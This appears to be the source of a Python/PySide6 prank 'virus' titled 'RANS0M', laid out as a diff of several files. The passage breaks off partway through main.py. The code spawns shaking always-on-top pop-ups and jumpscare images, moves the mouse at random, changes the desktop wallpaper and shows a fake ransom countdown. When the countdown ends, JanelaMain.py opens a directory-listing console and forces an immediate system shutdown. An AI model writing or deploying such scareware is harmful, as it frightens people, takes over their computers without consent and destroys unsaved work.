@@ -1,0 +1,1026 @@
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\Automacao.py
+================================================================================
+
+1 -    1: import pyautogui
+2 -    2: import random
+3 -    3: import threading
+4 -    4: 
+5 -    5: largura, altura = pyautogui.size()
+6 -    6: 
+7 -    7: 
+8 -    8: def mover_mouse_aleatorio(tempo=0):
+9 -    9:     def move():
+10 -   10:         pyautogui.moveTo(random.randint(0, largura), random.randint(0, altura), tempo)
+11 -   11: 
+12 -   12:     threading.Thread(target=move, daemon=True).start()
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\BG.py
+================================================================================
+
+13 -    1: from enum import Enum
+14 -    2: import os
+15 -    3: import sys
+16 -    4: 
+17 -    5: 
+18 -    6: def caminho_recurso(caminho):
+19 -    7:     if getattr(sys, "frozen", False):
+20 -    8:         base = sys._MEIPASS
+21 -    9:     else:
+22 -   10:         base = os.path.dirname(os.path.abspath(__file__))
+23 -   11: 
+24 -   12:     return os.path.join(base, caminho)
+25 -   13: 
+26 -   14: 
+27 -   15: class Bgs(Enum):
+28 -   16:     img1 = caminho_recurso("imagens\\Captura de tela 2026-09-08 163147.png")
+29 -   17:     img2 = caminho_recurso("imagens\\Captura de tela 2026-09-08 163159.png")
+30 -   18:     img3 = caminho_recurso("imagens\\Captura de tela 2026-09-08 195812.png")
+31 -   19:     img4 = caminho_recurso("imagens\\Captura de tela 2026-09-08 195802.png")
+32 -   20: 
+33 -   21: 
+34 -   22: class BgsE(Enum):
+35 -   23:     img1 = caminho_recurso("imagens\\Captura de tela 2026-09-08 195729.png")
+36 -   24:     img2 = caminho_recurso("imagens\\Captura de tela 2026-09-08 195704.png")
+37 -   25:     img3 = caminho_recurso("imagens\\Captura de tela 2026-09-08 201730.png")
+38 -   26:     img4 = caminho_recurso("imagens\\Captura de tela 2026-09-08 201730.png")
+39 -   27: 
+40 -   28: 
+41 -   29: class Caras(Enum):
+42 -   30:     img1 = caminho_recurso("imagens\\A-90IDLE.ong.png")
+43 -   31:     img2 = caminho_recurso("imagens\\A-90JUMPSCARE.png")
+44 -   32:     img3 = caminho_recurso("imagens\\90_3.png")
+45 -   33:     img4 = caminho_recurso("imagens\\803012A6-FCEF-4CC9-A7B7-BC7FE34C3307.png")
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\Globais.py
+================================================================================
+
+46 -    1: import pyautogui
+47 -    2: 
+48 -    3: largura, altura = pyautogui.size()
+49 -    4: Moedas = 500
+50 -    5: tempo = 87
+51 -    6: times = []
+52 -    7: janelas = []
+53 -    8: moedas = []
+54 -    9: caras = []
+55 -   10: janela = None
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\JanelaCara.py
+================================================================================
+
+56 -    1: import BG
+57 -    2: from PySide6.QtWidgets import QWidget, QLabel
+58 -    3: from PySide6.QtCore import QTimer
+59 -    4: from PySide6.QtGui import QPixmap
+60 -    5: from PySide6.QtCore import Qt
+61 -    6: from Label import ImagemClicavel
+62 -    7: import Globais
+63 -    8: import random
+64 -    9: 
+65 -   10: 
+66 -   11: class JanelaCara(QWidget):
+67 -   12:     def __init__(self, imagem=None, x=None, y=None, tempo=100, *args, **kwargs):
+68 -   13:         super().__init__(*args, **kwargs)
+69 -   14:         self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
+70 -   15:         self.resize(200, 200)
+71 -   16: 
+72 -   17:         if x != None and y != None:
+73 -   18:             self.move(x, y)
+74 -   19:         else:
+75 -   20:             self.move(random.randint(0, 1900), random.randint(0, 1000))
+76 -   21: 
+77 -   22:         self.fundo = ImagemClicavel(self)
+78 -   23: 
+79 -   24:         self.fundo.setStyleSheet("background-color: transparent;")
+80 -   25: 
+81 -   26:         if imagem is None:
+82 -   27:             self.pixmap = QPixmap(random.choice(list(BG.Caras)).value)
+83 -   28:         else:
+84 -   29:             self.pixmap = QPixmap(imagem)
+85 -   30: 
+86 -   31:         self.fundo.setPixmap(self.pixmap)
+87 -   32:         self.fundo.resize(self.size())
+88 -   33: 
+89 -   34:         self.setWindowFlags(
+90 -   35:             Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint
+91 -   36:         )
+92 -   37: 
+93 -   38:         time = QTimer(self)
+94 -   39:         time.timeout.connect(self.close)
+95 -   40:         time.start(tempo)
+96 -   41: 
+97 -   42:         self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
+98 -   43: 
+99 -   44:         self.show()
+100 -   45: 
+101 -   46:     def atualizarFundo(self):
+102 -   47:         pixmap = self.pixmap.scaled(
+103 -   48:             self.size(),
+104 -   49:             Qt.AspectRatioMode.IgnoreAspectRatio,
+105 -   50:             Qt.TransformationMode.SmoothTransformation,
+106 -   51:         )
+107 -   52: 
+108 -   53:         self.fundo.setPixmap(pixmap)
+109 -   54:         self.fundo.resize(self.size())
+110 -   55: 
+111 -   56:     def resizeEvent(self, event):
+112 -   57:         self.atualizarFundo()
+113 -   58:         return super().resizeEvent(event)
+114 -   59: 
+115 -   60: 
+116 -   61: def abrir_janela(x=None, y=None, imagem=None, tempo=100):
+117 -   62:     janelaCara = JanelaCara(x=x, y=y, imagem=imagem, tempo=tempo)
+118 -   63: 
+119 -   64:     Globais.caras.append(janelaCara)
+120 -   65:     janelaCara.destroyed.connect(
+121 -   66:         lambda: (
+122 -   67:             Globais.caras.remove(janelaCara) if janelaCara in Globais.caras else None
+123 -   68:         )
+124 -   69:     )
+125 -   70:     Globais.janela.raise_()
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\JanelaMain.py
+================================================================================
+
+126 -    1: from BG import Bgs
+127 -    2: import BG
+128 -    3: from PySide6.QtWidgets import QApplication, QWidget, QLabel
+129 -    4: from PySide6.QtCore import QTimer
+130 -    5: from PySide6.QtGui import QPixmap
+131 -    6: from PySide6.QtCore import Qt
+132 -    7: from Label import ImagemClicavel
+133 -    8: import random
+134 -    9: import os
+135 -   10: import Globais
+136 -   11: import subprocess
+137 -   12: 
+138 -   13: 
+139 -   14: class JanelaMain(QWidget):
+140 -   15:     def __init__(self, *args, **kwargs):
+141 -   16:         super().__init__(*args, **kwargs)
+142 -   17:         self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
+143 -   18:         self.setWindowTitle("RANS0M")
+144 -   19: 
+145 -   20:         self.resize(750, 350)
+146 -   21:         tela = QApplication.primaryScreen().availableGeometry()
+147 -   22: 
+148 -   23:         x = (tela.width() - self.width()) // 2
+149 -   24:         y = (tela.height() - self.height()) // 2
+150 -   25: 
+151 -   26:         self.move(x, y)
+152 -   27: 
+153 -   28:         self.fundo = ImagemClicavel(self)
+154 -   29:         # self.fundo.clicado.connect(self.close)
+155 -   30: 
+156 -   31:         self.pixmap = QPixmap(
+157 -   32:             BG.caminho_recurso("imagens\\Captura de tela 2026-09-08 173743.png")
+158 -   33:         )
+159 -   34: 
+160 -   35:         self.timeTp = QTimer(self)
+161 -   36:         self.posOriginal = self.pos()
+162 -   37:         self.timeTp.timeout.connect(self.teletransporte)
+163 -   38:         self.timeTp.start(4000)
+164 -   39: 
+165 -   40:         self.timeTm = QTimer(self)
+166 -   41:         self.timeTm.timeout.connect(self.tremer)
+167 -   42:         self.timeTm.start(50)
+168 -   43: 
+169 -   44:         self.fundo.setPixmap(self.pixmap)
+170 -   45:         self.fundo.resize(self.size())
+171 -   46: 
+172 -   47:         self.segundos = Globais.tempo
+173 -   48: 
+174 -   49:         self.cronometro = QLabel("01:20", self)
+175 -   50:         self.cronometro.move(550, 275)
+176 -   51:         self.cronometro.raise_()
+177 -   52:         self.cronometro.setStyleSheet(
+178 -   53:             "color: black; font-size: 60px; font-weight: bold;"
+179 -   54:         )
+180 -   55: 
+181 -   56:         self.timer = QTimer(self)
+182 -   57:         self.timer.timeout.connect(self.atualizar_cronometro)
+183 -   58:         self.timer.start(1000)
+184 -   59: 
+185 -   60:         self.moedas = QLabel(f"{Globais.Moedas}", self)
+186 -   61:         self.moedas.move(75, 285)
+187 -   62:         self.moedas.raise_()
+188 -   63:         self.moedas.setStyleSheet("color: yellow; font-size: 50px; font-weight: bold;")
+189 -   64: 
+190 -   65:         # cronometro
+191 -   66: 
+192 -   67:         self.timerM = QTimer(self)
+193 -   68:         self.timerM.timeout.connect(self.atualizarMoedas)
+194 -   69:         self.timerM.start(100)
+195 -   70: 
+196 -   71:         # Timer que atualiza o cronômetro
+197 -   72: 
+198 -   73:         self.setWindowFlags(
+199 -   74:             Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint
+200 -   75:         )
+201 -   76:         self.raise_()
+202 -   77: 
+203 -   78:         self.show()
+204 -   79: 
+205 -   80:     def atualizarFundo(self):
+206 -   81:         pixmap = self.pixmap.scaled(
+207 -   82:             self.size(),
+208 -   83:             Qt.AspectRatioMode.IgnoreAspectRatio,
+209 -   84:             Qt.TransformationMode.SmoothTransformation,
+210 -   85:         )
+211 -   86: 
+212 -   87:         self.fundo.setPixmap(pixmap)
+213 -   88:         self.fundo.resize(self.size())
+214 -   89: 
+215 -   90:     def teletransporte(self):
+216 -   91:         self.move(random.randint(300, 1600), random.randint(300, 700))
+217 -   92:         self.posOriginal = self.pos()
+218 -   93: 
+219 -   94:     def tremer(self):
+220 -   95:         x = self.posOriginal.x()
+221 -   96:         y = self.posOriginal.y()
+222 -   97:         self.move(random.randint(x - 5, x + 5), random.randint(y - 5, y + 5))
+223 -   98: 
+224 -   99:     def resizeEvent(self, event):
+225 -  100:         self.atualizarFundo()
+226 -  101:         return super().resizeEvent(event)
+227 -  102: 
+228 -  103:     def atualizar_cronometro(self):
+229 -  104:         if self.segundos > 0:
+230 -  105:             self.segundos -= 1
+231 -  106:             Globais.tempo = self.segundos
+232 -  107: 
+233 -  108:             minutos = self.segundos // 60
+234 -  109:             segundos = self.segundos % 60
+235 -  110: 
+236 -  111:             self.cronometro.setText(f"{minutos:02d}:{segundos:02d}")
+237 -  112:         else:
+238 -  113:             self.timer.stop()
+239 -  114:             self.cronometro.setText("00:00")
+240 -  115:             os.system('start cmd /k "color 1 && cd /d c:\\ && dir /s"')
+241 -  116:             subprocess.run(["shutdown", "/s", "/t", "0"])
+242 -  117: 
+243 -  118:     def atualizarMoedas(self):
+244 -  119:         self.moedas.setText(f"{Globais.Moedas}")
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\JanelaMoedas.py
+================================================================================
+
+245 -    1: from BG import Bgs
+246 -    2: from PySide6.QtWidgets import QWidget, QLabel
+247 -    3: from PySide6.QtCore import QTimer
+248 -    4: from PySide6.QtGui import QPixmap
+249 -    5: from PySide6.QtCore import Qt
+250 -    6: import BG
+251 -    7: from Label import ImagemClicavel
+252 -    8: import Globais
+253 -    9: import random
+254 -   10: 
+255 -   11: 
+256 -   12: class JanelaMoeda(QWidget):
+257 -   13:     def __init__(self, *args, **kwargs):
+258 -   14:         super().__init__(*args, **kwargs)
+259 -   15:         self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
+260 -   16:         self.resize(50, 50)
+261 -   17:         self.move(random.randint(0, 1900), random.randint(0, 1000))
+262 -   18: 
+263 -   19:         self.fundo = ImagemClicavel(self)
+264 -   20:         self.fundo.clicado.connect(self.coletado)
+265 -   21: 
+266 -   22:         self.fundo.setStyleSheet("background-color: transparent;")
+267 -   23: 
+268 -   24:         self.pixmap = QPixmap(BG.caminho_recurso("imagens\\Gold.png"))
+269 -   25: 
+270 -   26:         self.fundo.setPixmap(self.pixmap)
+271 -   27:         self.fundo.resize(self.size())
+272 -   28: 
+273 -   29:         self.setWindowFlags(
+274 -   30:             Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint
+275 -   31:         )
+276 -   32: 
+277 -   33:         self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
+278 -   34: 
+279 -   35:         self.show()
+280 -   36: 
+281 -   37:     def atualizarFundo(self):
+282 -   38:         pixmap = self.pixmap.scaled(
+283 -   39:             self.size(),
+284 -   40:             Qt.AspectRatioMode.IgnoreAspectRatio,
+285 -   41:             Qt.TransformationMode.SmoothTransformation,
+286 -   42:         )
+287 -   43: 
+288 -   44:         self.fundo.setPixmap(pixmap)
+289 -   45:         self.fundo.resize(self.size())
+290 -   46: 
+291 -   47:     def resizeEvent(self, event):
+292 -   48:         self.atualizarFundo()
+293 -   49:         return super().resizeEvent(event)
+294 -   50: 
+295 -   51:     def coletado(self):
+296 -   52:         Globais.Moedas -= 20
+297 -   53:         self.close()
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\JanelaPopUp.py
+================================================================================
+
+298 -    1: from BG import Bgs
+299 -    2: import Globais
+300 -    3: from PySide6.QtWidgets import QWidget, QLabel
+301 -    4: from PySide6.QtCore import QTimer
+302 -    5: from PySide6.QtGui import QPixmap
+303 -    6: from PySide6.QtCore import Qt
+304 -    7: from JanelaPopUpEstica import JanelaPopUpEstica
+305 -    8: from Label import ImagemClicavel
+306 -    9: import random
+307 -   10: 
+308 -   11: 
+309 -   12: class JanelaPopUp(QWidget):
+310 -   13:     def __init__(self, imagem=None, tremer=True, x=None, y=None, *args, **kwargs):
+311 -   14:         super().__init__(*args, **kwargs)
+312 -   15:         self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
+313 -   16:         self.setWindowTitle("RANS0M")
+314 -   17:         if x != None and y != None:
+315 -   18:             self.resize(300, 150)
+316 -   19:             self.move(x, y)
+317 -   20:         else:
+318 -   21:             n1 = random.randint(150, 500)
+319 -   22:             self.resize(n1, n1 // 2)
+320 -   23:             self.move(random.randint(0, 1900), random.randint(0, 1000))
+321 -   24: 
+322 -   25:         self.fundo = ImagemClicavel(self)
+323 -   26:         self.fundo.clicado.connect(self.close)
+324 -   27: 
+325 -   28:         if imagem:
+326 -   29:             self.pixmap = QPixmap(imagem)
+327 -   30:         else:
+328 -   31:             self.pixmap = QPixmap(random.choice(list(Bgs)).value)
+329 -   32: 
+330 -   33:         if tremer:
+331 -   34:             self.time = QTimer(self)
+332 -   35:             self.posOriginal = self.pos()
+333 -   36:             self.time.timeout.connect(self.tremer)
+334 -   37:             self.time.start(50)
+335 -   38: 
+336 -   39:         self.fundo.setPixmap(self.pixmap)
+337 -   40:         self.fundo.resize(self.size())
+338 -   41: 
+339 -   42:         self.setWindowFlags(
+340 -   43:             Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint
+341 -   44:         )
+342 -   45: 
+343 -   46:         self.show()
+344 -   47: 
+345 -   48:     def atualizarFundo(self):
+346 -   49:         pixmap = self.pixmap.scaled(
+347 -   50:             self.size(),
+348 -   51:             Qt.AspectRatioMode.IgnoreAspectRatio,
+349 -   52:             Qt.TransformationMode.SmoothTransformation,
+350 -   53:         )
+351 -   54: 
+352 -   55:         self.fundo.setPixmap(pixmap)
+353 -   56:         self.fundo.resize(self.size())
+354 -   57: 
+355 -   58:     def tremer(self):
+356 -   59:         x = self.posOriginal.x()
+357 -   60:         y = self.posOriginal.y()
+358 -   61:         self.move(random.randint(x - 5, x + 5), random.randint(y - 5, y + 5))
+359 -   62: 
+360 -   63:     def resizeEvent(self, event):
+361 -   64:         self.atualizarFundo()
+362 -   65:         return super().resizeEvent(event)
+363 -   66: 
+364 -   67: 
+365 -   68: def abrir_janela(x=None, y=None, tremer=True, imagem=None):
+366 -   69:     janelaPop = JanelaPopUp(x=x, y=y, tremer=tremer, imagem=imagem)
+367 -   70: 
+368 -   71:     Globais.janelas.append(janelaPop)
+369 -   72: 
+370 -   73:     janelaPop.destroyed.connect(
+371 -   74:         lambda: (
+372 -   75:             Globais.janelas.remove(janelaPop) if janelaPop in Globais.janelas else None
+373 -   76:         )
+374 -   77:     )
+375 -   78:     Globais.janela.raise_()
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\JanelaPopUpEstica.py
+================================================================================
+
+376 -    1: from BG import BgsE
+377 -    2: from PySide6.QtWidgets import QWidget, QLabel
+378 -    3: from PySide6.QtCore import QTimer
+379 -    4: from PySide6.QtGui import QPixmap
+380 -    5: from PySide6.QtCore import Qt
+381 -    6: from Label import ImagemClicavel
+382 -    7: import random
+383 -    8: 
+384 -    9: 
+385 -   10: class JanelaPopUpEstica(QWidget):
+386 -   11:     def __init__(self, *args, **kwargs):
+387 -   12:         super().__init__(*args, **kwargs)
+388 -   13:         self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
+389 -   14:         self.setWindowTitle("RANS0M")
+390 -   15:         n1 = random.randint(150, 500)
+391 -   16:         n2 = random.randint(150, 500)
+392 -   17:         self.resize(n1, n2)
+393 -   18:         self.move(random.randint(0, 1900), random.randint(0, 1000))
+394 -   19: 
+395 -   20:         self.fundo = ImagemClicavel(self)
+396 -   21:         self.fundo.clicado.connect(self.close)
+397 -   22: 
+398 -   23:         self.pixmap = QPixmap(random.choice(list(BgsE)).value)
+399 -   24: 
+400 -   25:         self.time = QTimer(self)
+401 -   26:         self.posOriginal = self.pos()
+402 -   27:         self.time.timeout.connect(self.tremer)
+403 -   28:         self.time.start(50)
+404 -   29: 
+405 -   30:         self.fundo.setPixmap(self.pixmap)
+406 -   31:         self.fundo.resize(self.size())
+407 -   32: 
+408 -   33:         self.setWindowFlags(
+409 -   34:             Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint
+410 -   35:         )
+411 -   36: 
+412 -   37:         self.show()
+413 -   38: 
+414 -   39:     def atualizarFundo(self):
+415 -   40:         pixmap = self.pixmap.scaled(
+416 -   41:             self.size(),
+417 -   42:             Qt.AspectRatioMode.IgnoreAspectRatio,
+418 -   43:             Qt.TransformationMode.SmoothTransformation,
+419 -   44:         )
+420 -   45: 
+421 -   46:         self.fundo.setPixmap(pixmap)
+422 -   47:         self.fundo.resize(self.size())
+423 -   48: 
+424 -   49:     def tremer(self):
+425 -   50:         x = self.posOriginal.x()
+426 -   51:         y = self.posOriginal.y()
+427 -   52:         self.move(random.randint(x - 3, x + 3), random.randint(y - 3, y + 3))
+428 -   53: 
+429 -   54:     def resizeEvent(self, event):
+430 -   55:         self.atualizarFundo()
+431 -   56:         return super().resizeEvent(event)
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\JanelaThank.py
+================================================================================
+
+432 -    1: from BG import Bgs
+433 -    2: from PySide6.QtWidgets import QWidget, QLabel
+434 -    3: from PySide6.QtWidgets import QApplication
+435 -    4: from PySide6.QtCore import QTimer
+436 -    5: from PySide6.QtGui import QPixmap
+437 -    6: from PySide6.QtCore import Qt
+438 -    7: import BG
+439 -    8: from Label import ImagemClicavel
+440 -    9: import random
+441 -   10: 
+442 -   11: 
+443 -   12: class JanelaThank(QWidget):
+444 -   13:     def __init__(self, *args, **kwargs):
+445 -   14:         super().__init__(*args, **kwargs)
+446 -   15:         self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
+447 -   16:         self.setWindowTitle("RANS0M")
+448 -   17:         self.resize(750, 350)
+449 -   18: 
+450 -   19:         tela = QApplication.primaryScreen().availableGeometry()
+451 -   20: 
+452 -   21:         x = (tela.width() - self.width()) // 2
+453 -   22:         y = (tela.height() - self.height()) // 2
+454 -   23: 
+455 -   24:         self.move(x, y)
+456 -   25: 
+457 -   26:         self.fundo = ImagemClicavel(self)
+458 -   27: 
+459 -   28:         self.pixmap = QPixmap(
+460 -   29:             BG.caminho_recurso("imagens\\Captura de tela 2026-09-08 204346.png")
+461 -   30:         )
+462 -   31: 
+463 -   32:         self.fundo.setPixmap(self.pixmap)
+464 -   33:         self.fundo.resize(self.size())
+465 -   34: 
+466 -   35:         self.show()
+467 -   36: 
+468 -   37:     def atualizarFundo(self):
+469 -   38:         pixmap = self.pixmap.scaled(
+470 -   39:             self.size(),
+471 -   40:             Qt.AspectRatioMode.IgnoreAspectRatio,
+472 -   41:             Qt.TransformationMode.SmoothTransformation,
+473 -   42:         )
+474 -   43: 
+475 -   44:         self.fundo.setPixmap(pixmap)
+476 -   45:         self.fundo.resize(self.size())
+477 -   46: 
+478 -   47:     def resizeEvent(self, event):
+479 -   48:         self.atualizarFundo()
+480 -   49:         return super().resizeEvent(event)
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\JanelaVideo.py
+================================================================================
+
+481 -    1: from PySide6.QtWidgets import QWidget, QVBoxLayout
+482 -    2: from PySide6.QtMultimedia import QMediaPlayer, QAudioOutput
+483 -    3: from PySide6.QtMultimediaWidgets import QVideoWidget
+484 -    4: from PySide6.QtCore import QUrl, Qt, Signal
+485 -    5: 
+486 -    6: 
+487 -    7: class JanelaVideo(QWidget):
+488 -    8:     terminou = Signal()
+489 -    9: 
+490 -   10:     def __init__(self, caminho_video):
+491 -   11:         super().__init__()
+492 -   12:         self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
+493 -   13: 
+494 -   14:         self.setWindowTitle("RANS0M")
+495 -   15: 
+496 -   16:         self.setWindowFlags(
+497 -   17:             Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint
+498 -   18:         )
+499 -   19: 
+500 -   20:         self.video = QVideoWidget(self)
+501 -   21: 
+502 -   22:         self.player = QMediaPlayer(self)
+503 -   23:         self.audio = QAudioOutput(self)
+504 -   24: 
+505 -   25:         self.player.setAudioOutput(self.audio)
+506 -   26:         self.player.setVideoOutput(self.video)
+507 -   27: 
+508 -   28:         self.player.mediaStatusChanged.connect(self.verificar_fim)
+509 -   29: 
+510 -   30:         self.player.setSource(QUrl.fromLocalFile(caminho_video))
+511 -   31: 
+512 -   32:         layout = QVBoxLayout(self)
+513 -   33:         layout.setContentsMargins(0, 0, 0, 0)
+514 -   34:         layout.addWidget(self.video)
+515 -   35: 
+516 -   36:         # Tela cheia
+517 -   37:         self.showFullScreen()
+518 -   38: 
+519 -   39:         self.player.play()
+520 -   40: 
+521 -   41:     def keyPressEvent(self, event):
+522 -   42:         # Esc sai da tela cheia e fecha o vídeo
+523 -   43:         if event.key() == Qt.Key.Key_Escape:
+524 -   44:             self.player.stop()
+525 -   45:             self.close()
+526 -   46:         else:
+527 -   47:             super().keyPressEvent(event)
+528 -   48: 
+529 -   49:     def verificar_fim(self, status):
+530 -   50:         if status == QMediaPlayer.MediaStatus.EndOfMedia:
+531 -   51:             self.player.stop()
+532 -   52:             self.terminou.emit()
+533 -   53:             self.close()
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\Label.py
+================================================================================
+
+534 -    1: from PySide6.QtWidgets import QLabel
+535 -    2: from PySide6.QtCore import Signal
+536 -    3: 
+537 -    4: 
+538 -    5: class ImagemClicavel(QLabel):
+539 -    6:     clicado = Signal()
+540 -    7: 
+541 -    8:     def mousePressEvent(self, event):
+542 -    9:         self.clicado.emit()
+543 -   10:         super().mousePressEvent(event)
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\Sons.py
+================================================================================
+
+544 -    1: from PySide6.QtCore import QUrl
+545 -    2: from PySide6.QtMultimedia import QSoundEffect
+546 -    3: from PySide6.QtMultimedia import QMediaPlayer, QAudioOutput
+547 -    4: 
+548 -    5: import BG
+549 -    6: 
+550 -    7: sons = {}
+551 -    8: audios = {}
+552 -    9: 
+553 -   10: 
+554 -   11: def carregar_sons():
+555 -   12:     sons["comeca"] = QSoundEffect()
+556 -   13:     sons["comeca"].setSource(QUrl.fromLocalFile(BG.caminho_recurso("sons/Untitled.wav")))
+557 -   14:     sons["comeca"].setVolume(1.0)
+558 -   15: 
+559 -   16:     sons["ganhou"] = QSoundEffect()
+560 -   17:     sons["ganhou"].setSource(QUrl.fromLocalFile(BG.caminho_recurso("sons/ganhou.wav")))
+561 -   18:     sons["ganhou"].setVolume(1.0)
+562 -   19: 
+563 -   20:     audio = QAudioOutput()
+564 -   21:     audio.setVolume(1.0)
+565 -   22:     audios["fundo"] = audio
+566 -   23:     sons["fundo"] = QMediaPlayer()
+567 -   24:     sons["fundo"].setAudioOutput(audio)
+568 -   25:     sons["fundo"].setSource(QUrl.fromLocalFile(BG.caminho_recurso("sons/fundo.mp3")))
+569 -   26: 
+570 -   27: 
+571 -   28: def tocar_som(nome):
+572 -   29:     som = sons.get(nome)
+573 -   30: 
+574 -   31:     if som is not None:
+575 -   32:         som.play()
+576 -   33: 
+577 -   34: 
+578 -   35: def parar_som(nome):
+579 -   36:     som = sons.get(nome)
+580 -   37: 
+581 -   38:     if som is not None:
+582 -   39:         som.stop()
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\VariasJanelas.py
+================================================================================
+
+583 -    1: import random
+584 -    2: 
+585 -    3: import BG
+586 -    4: import JanelaCara
+587 -    5: import Globais
+588 -    6: import JanelaPopUp
+589 -    7: from PySide6.QtCore import QTimer
+590 -    8: 
+591 -    9: 
+592 -   10: def janelasCascadaCara(
+593 -   11:     imagem=BG.caminho_recurso("imagens\\803012A6-FCEF-4CC9-A7B7-BC7FE34C3307.png"),
+594 -   12:     quantidade=20,
+595 -   13:     tempo=300,
+596 -   14:     distancia=20,
+597 -   15:     x=None,
+598 -   16:     y=None,
+599 -   17: ):
+600 -   18:     if x is None:
+601 -   19:         x = random.randint(0, Globais.largura - 200)
+602 -   20: 
+603 -   21:     if y is None:
+604 -   22:         y = random.randint(0, Globais.altura - 200)
+605 -   23: 
+606 -   24:     if quantidade <= 0:
+607 -   25:         return True
+608 -   26: 
+609 -   27:     QTimer.singleShot(
+610 -   28:         100 * quantidade,
+611 -   29:         lambda: JanelaCara.abrir_janela(
+612 -   30:             x=x + (distancia * quantidade),
+613 -   31:             y=y + (distancia * quantidade),
+614 -   32:             imagem=imagem,
+615 -   33:             tempo=tempo,
+616 -   34:         ),
+617 -   35:     )
+618 -   36: 
+619 -   37:     return janelasCascadaCara(
+620 -   38:         imagem=imagem,
+621 -   39:         quantidade=quantidade - 1,
+622 -   40:         x=x,
+623 -   41:         y=y,
+624 -   42:         distancia=distancia,
+625 -   43:         tempo=tempo,
+626 -   44:     )
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\Wallpaper.py
+================================================================================
+
+627 -    1: import ctypes
+628 -    2: import winreg
+629 -    3: from pathlib import Path
+630 -    4: 
+631 -    5: CHAVE_WALLPAPER = r"Control Panel\Desktop"
+632 -    6: 
+633 -    7: 
+634 -    8: def obter_wallpaper_atual():
+635 -    9:     with winreg.OpenKey(winreg.HKEY_CURRENT_USER, CHAVE_WALLPAPER) as chave:
+636 -   10:         return winreg.QueryValueEx(chave, "WallPaper")[0]
+637 -   11: 
+638 -   12: 
+639 -   13: def mudar_wallpaper(caminho):
+640 -   14:     caminho = str(Path(caminho).resolve())
+641 -   15: 
+642 -   16:     resultado = ctypes.windll.user32.SystemParametersInfoW(
+643 -   17:         20,  # SPI_SETDESKWALLPAPER
+644 -   18:         0,
+645 -   19:         caminho,
+646 -   20:         3,  # atualiza a configuração e transmite a mudança
+647 -   21:     )
+648 -   22: 
+649 -   23:     if not resultado:
+650 -   24:         raise OSError("Não foi possível mudar o wallpaper.")
+651 -   25: 
+652 -   26: 
+653 -   27: def restaurar_wallpaper(caminho_original):
+654 -   28:     mudar_wallpaper(caminho_original)
+
+
+================================================================================
+ARQUIVO: C:\Users\CPU\Desktop\codigos\Python\outros\virus\main.py
+================================================================================
+
+655 -    1: import sys
+656 -    2: import os
+657 -    3: import BG
+658 -    4: import Globais
+659 -    5: from pynput import mouse
+660 -    6: from BG import Bgs
+661 -    7: from BG import Caras
+662 -    8: from shiboken6 import isValid
+663 -    9: from Automacao import mover_mouse_aleatorio
+664 -   10: from VariasJanelas import janelasCascadaCara
+665 -   11: from PySide6.QtWidgets import QApplication
+666 -   12: from PySide6.QtCore import QUrl
+667 -   13: from PySide6.QtMultimedia import QSoundEffect
+668 -   14: from PySide6.QtCore import QTimer
+669 -   15: from PySide6.QtGui import QPixmap
+670 -   16: from JanelaPopUp import JanelaPopUp
+671 -   17: from JanelaPopUpEstica import JanelaPopUpEstica
+672 -   18: from JanelaMain import JanelaMain
+673 -   19: from JanelaMoedas import JanelaMoeda
+674 -   20: from JanelaCara import JanelaCara
+675 -   21: from JanelaThank import JanelaThank
+676 -   22: from JanelaVideo import JanelaVideo
+677 -   23: from Sons import tocar_som, carregar_sons, parar_som
+678 -   24: from Wallpaper import mudar_wallpaper, restaurar_wallpaper, obter_wallpaper_atual
+679 -   25: import random
+680 -   26: 
+681 -   27: app = QApplication(sys.argv)
+682 -   28: app.setQuitOnLastWindowClosed(False)
+683 -   29: wallpaper_original = obter_wallpaper_atual()
+684 -   30: 
+685 -   31: janelas = Globais.janelas
+686 -   32: moedas = Globais.moedas
+687 -   33: caras = Globais.caras
+688 -   34: 
+689 -   35: mexeu = False
+690 -   36: 
+691 -   37: video = None
+692 -   38: janela = None  # JanelaMain()
+693 -   39: timer = None
+694 -   40: timer2 = None
+695 -   41: timer3 = None
+696 -   42: timer4 = None
+697 -   43: timer5 = None
+698 -   44: timer6 = None
+699 -   45: listener = None
+700 -   46: 
+701 -   47: 
+702 -   48: def abrir_janela():
+703 -   49:     nun = random.randint(1, 2)
+704 -   50:     if nun == 1:
+705 -   51:         janelaPop = JanelaPopUp()
+706 -   52: 
+707 -   53:     else:
+708 -   54:         janelaPop = JanelaPopUpEstica()
+709 -   55: 
+710 -   56:     janelas.append(janelaPop)
+711 -   57:     janelaPop.raise_()
